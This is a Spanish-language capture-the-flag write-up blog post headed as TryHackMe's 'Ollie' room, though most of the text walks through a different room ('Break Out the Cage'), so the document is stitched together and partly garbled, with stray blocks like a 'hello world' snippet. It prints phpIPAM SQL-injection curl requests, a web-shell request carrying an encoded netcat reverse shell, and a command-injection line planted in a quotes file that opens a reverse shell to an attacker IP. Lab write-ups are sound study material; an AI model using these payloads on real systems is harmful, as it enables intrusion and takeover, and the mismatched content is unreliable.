---
layout: single
title: Ollie - TryHackMe
excerpt: "Meet the world's most powerful hacker dog!"
date: 2022-04-19
classes: wide
header:
  teaser: /assets/images/thm-writeup-ollie/ollie_logo.png
  teaser_home_page: true
  icon: /assets/images/thm_ico.png
categories:
  - TryHackMe
  - infosec
tags:
  - CVE
  - Security
  - Ollie
  - Exploit

---


![](/assets/images/thm-writeup-ollie/ollie_logo.png)

 [Link](https://tryhackme.com/room/ollie "Ollie")

Ollie Unix Montgomery, the infamous hacker dog, is a great red teamer. As for development... not so much! Rumor has it, Ollie messed with a few of the files on the server to ensure backward compatibility. Take control before time runs out!!

## 1. Fase de reconocimiento

- Para  conocer a que nos estamos enfrentando lanzamos el siguiente comando:


```bash
ping -c 1 {ip}
```


```
print("hello world")
```


~~~bash
└─$ ping -c 1 10.10.96.248
PING 10.10.96.248 (10.10.96.248) 56(84) bytes of data.
64 bytes from 10.10.96.248: icmp_seq=1 ttl=63 time=162 ms

--- 10.10.96.248 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 161.558/161.558/161.558/0.000 ms

~~~

- De acuerdo con el ***ttl=63***, sabemos que nos estamos enfrentando ante una máquina con sistema operativo linux.

- Whatweb, nos muestra la siguiente información:
  
  ```bash
  └─$ whatweb 10.10.96.248                         
http://10.10.96.248 [302 Found] Apache[2.4.41], Cookies[phpipamredirect], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], HttpOnly[phpipamredirect], IP[10.10.96.248], RedirectLocation[http://10.10.96.248/index.php?page=login]
http://10.10.96.248/index.php?page=login [200 OK] Apache[2.4.41], Bootstrap, Cookies[phpipam], Country[RESERVED][ZZ], Email[0day@ollieshouse.thm], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], HttpOnly[phpipam], IP[10.10.96.248], JQuery[3.5.1], PasswordField[ipampassword], Script[text/javascript], Title[Ollie :: login], X-UA-Compatible[IE=9,chrome=1], X-XSS-Protection[1; mode=block]

  ```
---

- Página web: observamos la siguiente página:

![](/assets/images/thm-writeup-ollie/ollie_page.png "ollie-page")


---

## 2. Enumeración / Escaneo

### 2.1 Nmap

- Escaneo de los 65536 puertos de red con nmap:
  
```bash
└─# nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.96.248 -oN allports
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-19 20:32 -05
Initiating SYN Stealth Scan at 20:32
Scanning 10.10.96.248 [65535 ports]
Discovered open port 22/tcp on 10.10.96.248
Discovered open port 80/tcp on 10.10.96.248
Discovered open port 1337/tcp on 10.10.96.248
Completed SYN Stealth Scan at 20:33, 14.61s elapsed (65535 total ports)
Nmap scan report for 10.10.96.248
Host is up, received user-set (0.17s latency).
Scanned at 2022-04-19 20:32:52 -05 for 15s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
1337/tcp open  waste   syn-ack ttl 62

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.70 seconds
           Raw packets sent: 72151 (3.175MB) | Rcvd: 71568 (2.863MB)
```

- El anterior escaneo evidencia los siguientes puertos abiertos:

| Puerto  | Descripción |
| ---     | ---         |
| 22      | ssh         |
| 80      | htp         |
| 1337    | waste       |

- Escaneo en busca de vulnerabilidades sobre los puertos abiertos:

```bash
└─# nmap -sCV -A -T4 -p22,80,1337 10.10.96.248                               
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-19 20:35 -05
Nmap scan report for 10.10.96.248 (10.10.96.248)
Host is up (0.16s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b7:1b:a8:f8:8c:8a:4a:53:55:c0:2e:89:01:f2:56:69 (RSA)
|   256 4e:27:43:b6:f4:54:f9:18:d0:38:da:cd:76:9b:85:48 (ECDSA)
|_  256 14:82:ca:bb:04:e5:01:83:9c:d6:54:e9:d1:fa:c4:82 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-title: Ollie :: login
|_Requested resource was http://10.10.96.248/index.php?page=login
| http-robots.txt: 2 disallowed entries 
|_/ /immaolllieeboyyy
|_http-server-header: Apache/2.4.41 (Ubuntu)
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP, GenericLines: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, 
|     It's been a while. What are you here for?
|   DNSVersionBindReqTCP: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, 
|     version
|     bind
|     It's been a while. What are you here for?
|   GetRequest: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Get / http/1.0
|     It's been a while. What are you here for?
|   HTTPOptions: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Options / http/1.0
|     It's been a while. What are you here for?
|   Help: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Help
|     It's been a while. What are you here for?
|   NULL, RPCCheck: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name?
|   RTSPRequest: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Options / rtsp/1.0
|_    It's been a while. What are you here for?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.92%I=7%D=4/19%Time=625F634C%P=x86_64-pc-linux-gnu%r(NU
SF:LL,59,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\
SF:x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20
SF:")%r(GenericLines,93,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protector\x2
SF:0of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\x20you
SF:r\x20name\?\x20What's\x20up,\x20\r\n\r!\x20It's\x20been\x20a\x20while\.
SF:\x20What\x20are\x20you\x20here\x20for\?\x20")%r(GetRequest,A1,"Hey\x20s
SF:tranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\
SF:x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x
SF:20Get\x20/\x20http/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\
SF:x20are\x20you\x20here\x20for\?\x20")%r(HTTPOptions,A5,"Hey\x20stranger,
SF:\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\
SF:x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x20Option
SF:s\x20/\x20http/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\x20a
SF:re\x20you\x20here\x20for\?\x20")%r(RTSPRequest,A5,"Hey\x20stranger,\x20
SF:I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20a
SF:ntlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x20Options\x2
SF:0/\x20rtsp/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x
SF:20you\x20here\x20for\?\x20")%r(RPCCheck,59,"Hey\x20stranger,\x20I'm\x20
SF:Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\
SF:.\n\nWhat\x20is\x20your\x20name\?\x20")%r(DNSVersionBindReqTCP,B0,"Hey\
SF:x20stranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x2
SF:0of\x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20u
SF:p,\x20\0\x1e\0\x06\x01\0\0\x01\0\0\0\0\0\0\x07version\x04bind\0\0\x10\0
SF:\x03!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x20you\x20here\x20
SF:for\?\x20")%r(DNSStatusRequestTCP,9E,"Hey\x20stranger,\x20I'm\x20Ollie,
SF:\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nW
SF:hat\x20is\x20your\x20name\?\x20What's\x20up,\x20\0\x0c\0\0\x10\0\0\0\0\
SF:0\0\0\0\0!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x20you\x20her
SF:e\x20for\?\x20")%r(Help,95,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protec
SF:tor\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\
SF:x20your\x20name\?\x20What's\x20up,\x20Help\r!\x20It's\x20been\x20a\x20w
SF:hile\.\x20What\x20are\x20you\x20here\x20for\?\x20");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   161.55 ms 10.9.0.1 (10.9.0.1)
2   161.70 ms 10.10.96.248 (10.10.96.248)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.86 seconds
```



curl 'http://10.10.96.248/app/admin/custom-fields/edit.php' -H 'User-Agent: Mozilla/5.0 AppleWebKit/537.36 537.36' -H 'Cookie: phpipam=b852d916168309592ddade2e11847e48; table-page-size=50' -d 'action=add&table=users`where 1=(updatexml(1,concat(0x3a,(select user())),1))#`' --compressed --insecure

curl 'http://10.10.96.248/app/admin/custom-fields/edit-result.php' -H 'User-Agent: Mozilla/5.0 AppleWebKit/537.36 537.36' -H 'Cookie: phpipam=b852d916168309592ddade2e11847e48; table-page-size=50' -d 'action=add&table=users`;select * from users where 1=sleep(10);#`&csrf_cookie=ylbgj5gvd5OFeTeVPMQVgCaD8zxMro1R&name=asdfadsf' --compressed --insecure

curl 'http://10.10.96.248/app/admin/custom-fields/filter-result.php'-H 'User-Agent: Mozilla/5.0 AppleWebKit/537.36 537.36' -H 'Cookie: phpipam=b852d916168309592ddade2e11847e48; table-page-size=50' -d 'action=add&table=users`where 1=(updatexml(1,concat(0x3a,(select user())),1))#`' --compressed --insecure

curl 'http://10.10.96.248/app/admin/custom-fields/order.php' -H 'User-Agent: Mozilla/5.0 AppleWebKit/537.36 537.36' -H 'Cookie: phpipam=b852d916168309592ddade2e11847e48; table-page-size=50' -d 'action=add&table=users`;select * from users where 1=sleep(10);#`&current=1&next=3' --compressed --insecure

$ python3 -m pip install requests
$ python3 exploit.py -u http://localhost:8082 -U <admin> -P <password>

[Terminal 1]
╰─ curl http://10.10.96.248/shell.php\?cmd\=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.9.0.244%201337%20%3E%2Ftmp%2Ff

------------------------------------------------------------------------------------------

[Terminal 2]
╰─ nc -nlvp 1337                                                                                ─╯
listening on [any] 1337 ...
connect to [10.9.0.244] from (UNKNOWN) [10.10.229.233] 43490
sh: 0: can't access tty; job control turned off
$ id; whoami; pwd; hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
/var/www/html
hackerdog









### 2.2 WFUZZ

- Procedemos a realizar escaneo de los directorios:
  
```
└─# wfuzz --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 10.10.155.102/FUZZ
/usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.155.102/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                
=====================================================================                        
000000002:   200        62 L     251 W      2453 Ch     "#"                                    
000000004:   200        62 L     251 W      2453 Ch     "#"                                    
000000014:   200        62 L     251 W      2453 Ch     "http://10.10.155.102/"                
000000016:   301        9 L      28 W       315 Ch      "images"                               
000000092:   301        9 L      28 W       313 Ch      "html"                                 
000000274:   301        9 L      28 W       316 Ch      "scripts"                              
000003674:   301        9 L      28 W       318 Ch      "contracts"                            
000045240:   200        62 L     251 W      2453 Ch     "http://10.10.155.102/"                
000060582:   301        9 L      28 W       318 Ch      "auditions"                            
000095524:   403        9 L      28 W       278 Ch      "server-status" 
```
- Se encuentran las siguientes páginas:

***html***

![](/assets/images/thm-writeup-break-out-the-cage/cage_html.png)

***scripts***

![](/assets/images/thm-writeup-break-out-the-cage/cage_scripts.png)

***contracts***

![](/assets/images/thm-writeup-break-out-the-cage/cage_contracts.png)

***auditions***

![](/assets/images/thm-writeup-break-out-the-cage/cage_auditions.png)


### 2.3 FTP

- Ingresamos al servidor **ftp**, en el cual encontramos un docuemto llamado **dad_tasks**, el cual procedemos a descargar, como se observa a continuación:

```
└─# ftp anonymous@10.10.155.102 
Connected to 10.10.155.102.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||29536|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||63995|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 25  2020 .
drwxr-xr-x    2 0        0            4096 May 25  2020 ..
-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
226 Directory send OK.
ftp> get dad_tasks
local: dad_tasks remote: dad_tasks
229 Entering Extended Passive Mode (|||42860|)
150 Opening BINARY mode data connection for dad_tasks (396 bytes).
100% |***********************************************************|   396      166.76 KiB/s    00:00 ETA
226 Transfer complete.
396 bytes received in 00:00 (2.39 KiB/s)
ftp> 
```
- Procedemo a revisar el contenido del documento descargado y nos encontramos con un código cifrado:
  
![](/assets/images/thm-writeup-break-out-the-cage/cage_ftp1.png)

 
- Procedemos a decoficar el código en base 64:
  
![](/assets/images/thm-writeup-break-out-the-cage/cage_64.png)


- Al analizar el resultado, se evidencia que está cifrado, procedemos a identificar el tipo de cifrado desde la siguiente url: https://www.boxentriq.com/code-breaking/cipher-identifier, la que nos entrega el siguiente resultado: Your ciphertext is likely of this type:
***Vigenere Cipher***

- Procedemos a tratar de descifrarlo desde: https://gchq.github.io/CyberChef/ pero nos pide una ***key***.

- Desde la páfina auditions, encontramos un archivo en mp3 llamado: must_practice_corrupt_file.mp3, que a los pocos segundos de escucharlo suena una interferencia estridente, al descargarlo y al analizarlo desde audicity, desde la opción: "Espectograma" se observa la siguiente frase:

![](/assets/images/thm-writeup-break-out-the-cage/cage_mp3.png)


- Con la frase encontrado en el punto anterior procedemos a descifrar el texto codificado en ***vigenère***, como se ve a continuación:
  
![](/assets/images/thm-writeup-break-out-the-cage/cage_vigenere.png)

- Con el paso anterior podemos responder la siguieten pregunta: ***What is Weston's password?***

### 2.4 SSH 

- Con la contraseña encontrada encontrada en el punto anterior procedemos a conectarnos vía ***SSH***:_

```
└─# ssh weston@10.10.155.102                        
The authenticity of host '10.10.155.102 (10.10.155.102)' can't be established.
ED25519 key fingerprint is SHA256:o7pzAxWHDEV8n+uNpDnQ+sjkkBvKP3UVlNw2MpzspBw.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.155.102' (ED25519) to the list of known hosts.
weston@10.10.155.102's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Apr 19 03:34:54 UTC 2022

  System load:  0.0                Processes:           91
  Usage of /:   20.4% of 19.56GB   Users logged in:     0
  Memory usage: 20%                IP address for eth0: 10.10.155.102
  Swap usage:   0%


39 packages can be updated.
0 updates are security updates.


         __________
        /\____;;___\
       | /         /
       `. ())oo() .
        |\(%()*^^()^\
       %| |-%-------|
      % \ | %  ))   |
      %  \|%________|
       %%%%
Last login: Tue May 26 10:58:20 2020 from 192.168.247.1
                                                                               
Broadcast message from cage@national-treasure (somewhere) (Tue Apr 19 03:36:01 
                                                                               
I mean it, honey, the world is being Fed-exed to hell in a hand cart. — The Rock
                                                                               
```

## 3 Explotacion

- Ejecutamos ***linpeas*** y encontramo los siguientes archivos que pueden ser modificados

 ![](/assets/images/thm-writeup-break-out-the-cage/cage_linpeas.png)

/opt/.dads_scripts/.files
/opt/.dads_scripts/.files/.quotes

- Revisamos el script ***spread_the_quotes.py*** y observamos que es de solo lectura, pero toma los datos desl archivo ***.quotes***, el cual como vimos arriba si nos permite modificarlo.

```
weston@national-treasure:/opt/.dads_scripts$ cat spread_the_quotes.py 
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)

weston@national-treasure:/opt/.dads_scripts$ 
```


weston@national-treasure:/opt/.dads_scripts/.files$ echo "Nicolas; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.216 4444 >/tmp/f" > .quotes


## 4 Bandera de usuario

- Ganamos acceso como usuario Cage y en el archivo ***Super_Duper_Checklist*** encontramos la bandera:
  
~~~
cage@national-treasure:~$ cd Super_Duper_Checklist
cd Super_Duper_Checklist
bash: cd: Super_Duper_Checklist: Not a directory
cage@national-treasure:~$ cat Super_Duper_Checklist
cat Super_Duper_Checklist
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: THM{???????????}
~~~


## 5 Escalada de Privelegios

- En los correos encontrados, se encuentra el siguiente texto codificado:

```
cage@national-treasure:~/email_backup$ cat email_3
cat email_3
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

haiinspsyanileph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd. 

Regards

hola hijo

Amigo, Sean dejó una nota en su escritorio con una escritura muy extraña. rápidamente escribí
abajo lo que dijo. ¿Podrías investigarlo por favor? Creo que podría tener algo que ver con él.
cuenta aquí. Quiero saber qué me está ocultando... Puede que necesite un nuevo agente. Lindo
Seguro que él está afuera para atraparme. La nota decía:

haiinspsyanileph

El chico también parece obsesionado con mi cara últimamente. Llegó con una máscara de mi cara...
era bastante extraño. Imagina usar su fea cara... ¡¡No sería capaz de ENFRENTAR eso!!
hahahahahahahahahahahahahahaahah entiéndelo Weston! ENFRENTAR ESO !!!! jajajajajajajaja
jajajajajaja Ahhh Acéptalo... es simplemente extraño.

Saludos
```
---

- Desde cyberchef, procedemos a descifrarla con ***vigenére*** y con la key ***face*** que se repite de manera insistente en el correo y de está manera obtenemos el password de root:
  
 ![](/assets/images/thm-writeup-break-out-the-cage/cage_root.png)

  ![](/assets/images/thm-writeup-break-out-the-cage/cage_root2.png)

  ---

  Eso es todo!

  Fuentes:

  ¿Atascado con un cifrado o criptograma? Esta herramienta lo ayudará a identificar el tipo de cifrado, así como también le brindará información sobre herramientas posiblemente útiles para resolverlo.
  https://www.boxentriq.com/code-breaking/cipher-identifier

  GTFOBins es una lista seleccionada de archivos binarios de Unix que se pueden usar para eludir las restricciones de seguridad locales en sistemas mal configurados.
  https://gtfobins.github.io/#

  Cyberchef: herramienta en linea para descifrar.
  https://gchq.github.io/CyberChef/

  Writeup:
  https://0xnirvana.gitbook.io/writeups/tryhackme/easy/break-out-of-the-cage





